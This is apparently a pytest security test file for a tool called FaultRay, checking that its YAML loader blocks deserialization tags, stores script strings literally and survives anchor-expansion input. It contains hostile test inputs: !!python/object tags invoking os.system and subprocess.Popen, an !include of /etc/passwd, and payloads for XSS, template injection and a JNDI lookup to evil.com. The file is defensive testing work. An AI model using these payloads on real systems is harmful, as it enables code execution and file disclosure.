# Copyright (c) 2025-2026 Yutaro Maeda. All rights reserved.
# Licensed under the Apache License 2.0. See LICENSE file for details.

"""L11 Injection Defense Tests — AI-era Trust layer.

Validates that FaultRay is protected against YAML deserialization attacks:
- !!python/object and other dangerous YAML tags
- Script injection in topology definitions
- Arbitrary code execution prevention
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from faultray.errors import ValidationError
from faultray.model.loader import load_yaml


# ---------------------------------------------------------------------------
# L11-INJ-001: YAML deserialization attacks
# ---------------------------------------------------------------------------


class TestYamlDeserializationAttacks:
    """Verify that dangerous YAML tags are blocked by safe_load."""

    def test_python_object_tag_blocked(self, tmp_path: Path) -> None:
        """!!python/object should not execute code."""
        malicious_yaml = (
            "components:\n"
            "  - id: evil\n"
            "    name: !!python/object/apply:os.system ['echo hacked']\n"
            "    type: app_server\n"
            "dependencies: []\n"
        )
        yaml_file = tmp_path / "evil.yaml"
        yaml_file.write_text(malicious_yaml)
        with pytest.raises((yaml.constructor.ConstructorError, ValidationError, Exception)):
            load_yaml(yaml_file)

    def test_python_name_tag_blocked(self, tmp_path: Path) -> None:
        """!!python/name should not resolve Python names."""
        malicious_yaml = (
            "components:\n"
            "  - id: evil\n"
            "    name: !!python/name:os.system\n"
            "    type: app_server\n"
            "dependencies: []\n"
        )
        yaml_file = tmp_path / "evil2.yaml"
        yaml_file.write_text(malicious_yaml)
        with pytest.raises((yaml.constructor.ConstructorError, ValidationError, Exception)):
            load_yaml(yaml_file)

    def test_python_module_tag_blocked(self, tmp_path: Path) -> None:
        """!!python/module should not import modules."""
        malicious_yaml = (
            "components:\n"
            "  - id: evil\n"
            "    name: !!python/module:os\n"
            "    type: app_server\n"
            "dependencies: []\n"
        )
        yaml_file = tmp_path / "evil3.yaml"
        yaml_file.write_text(malicious_yaml)
        with pytest.raises((yaml.constructor.ConstructorError, ValidationError, Exception)):
            load_yaml(yaml_file)

    def test_python_object_new_tag_blocked(self, tmp_path: Path) -> None:
        """!!python/object/new should not instantiate objects."""
        malicious_yaml = (
            "components:\n"
            "  - id: evil\n"
            "    name: !!python/object/new:subprocess.Popen\n"
            "      args:\n"
            "        - ['echo', 'hacked']\n"
            "    type: app_server\n"
            "dependencies: []\n"
        )
        yaml_file = tmp_path / "evil4.yaml"
        yaml_file.write_text(malicious_yaml)
        with pytest.raises((yaml.constructor.ConstructorError, ValidationError, Exception)):
            load_yaml(yaml_file)

    def test_include_directive_not_followed(self, tmp_path: Path) -> None:
        """Custom !include directives should not read arbitrary files."""
        malicious_yaml = (
            "components: !include /etc/passwd\n"
            "dependencies: []\n"
        )
        yaml_file = tmp_path / "include.yaml"
        yaml_file.write_text(malicious_yaml)
        with pytest.raises((yaml.constructor.ConstructorError, ValidationError, Exception)):
            load_yaml(yaml_file)


# ---------------------------------------------------------------------------
# L11-INJ-002: Script injection in topology definitions
# ---------------------------------------------------------------------------


class TestScriptInjection:
    """Verify that script content in fields is treated as data, not code."""

    SCRIPT_PAYLOADS = [
        "<script>alert('xss')</script>",
        "{{ __import__('os').system('id') }}",
        "${jndi:ldap://evil.com/exploit}",
        "{{7*7}}",
        "__import__('subprocess').check_output(['id'])",
        "exec('import os; os.system(\"id\")')",
    ]

    @pytest.mark.parametrize("payload", SCRIPT_PAYLOADS)
    def test_script_in_component_name_stored_literally(
        self, payload: str, tmp_path: Path,
    ) -> None:
        """Script content in component name should be stored as plain text."""
        yaml_content = {
            "components": [
                {"id": "safe", "name": payload, "type": "app_server"},
            ],
            "dependencies": [],
        }
        yaml_file = tmp_path / "script.yaml"
        yaml_file.write_text(yaml.dump(yaml_content))
        graph = load_yaml(yaml_file)
        comp = graph.get_component("safe")
        assert comp is not None
        # The payload should be stored verbatim, never evaluated
        assert comp.name == payload

    @pytest.mark.parametrize("payload", SCRIPT_PAYLOADS)
    def test_script_in_host_field_stored_literally(
        self, payload: str, tmp_path: Path,
    ) -> None:
        """Script content in host field should be stored as plain text."""
        yaml_content = {
            "components": [
                {"id": "h1", "name": "Test", "type": "app_server", "host": payload},
            ],
            "dependencies": [],
        }
        yaml_file = tmp_path / "host_inj.yaml"
        yaml_file.write_text(yaml.dump(yaml_content))
        graph = load_yaml(yaml_file)
        comp = graph.get_component("h1")
        assert comp is not None
        assert comp.host == payload

    @pytest.mark.parametrize("payload", SCRIPT_PAYLOADS)
    def test_script_in_tags_stored_literally(
        self, payload: str, tmp_path: Path,
    ) -> None:
        """Script content in tags should be stored as plain text."""
        yaml_content = {
            "components": [
                {"id": "t1", "name": "Test", "type": "app_server", "tags": [payload]},
            ],
            "dependencies": [],
        }
        yaml_file = tmp_path / "tag_inj.yaml"
        yaml_file.write_text(yaml.dump(yaml_content))
        graph = load_yaml(yaml_file)
        comp = graph.get_component("t1")
        assert comp is not None
        assert payload in comp.tags


# ---------------------------------------------------------------------------
# L11-INJ-003: Billion laughs / YAML bomb
# ---------------------------------------------------------------------------


class TestYamlBomb:
    """Verify protection against YAML entity expansion attacks."""

    def test_deeply_nested_yaml_does_not_hang(self, tmp_path: Path) -> None:
        """Extremely nested YAML should not cause stack overflow or hang."""
        # Create a deeply nested but small structure
        nested = "a: " + "  " * 50 + "value"
        yaml_file = tmp_path / "deep.yaml"
        yaml_file.write_text(nested)
        # Should either parse or raise, not hang
        try:
            yaml.safe_load(yaml_file.read_text())
        except Exception:
            pass  # Any exception is fine, as long as it doesn't hang

    def test_safe_load_prevents_billion_laughs(self) -> None:
        """yaml.safe_load should handle recursive references safely."""
        # YAML aliases/anchors are limited by safe_load
        yaml_text = (
            "a: &a ['lol','lol']\n"
            "b: &b [*a,*a]\n"
            "c: &c [*b,*b]\n"
            "d: [*c,*c]\n"
        )
        # safe_load handles this fine (it's anchors, not entity expansion)
        result = yaml.safe_load(yaml_text)
        assert isinstance(result, dict)
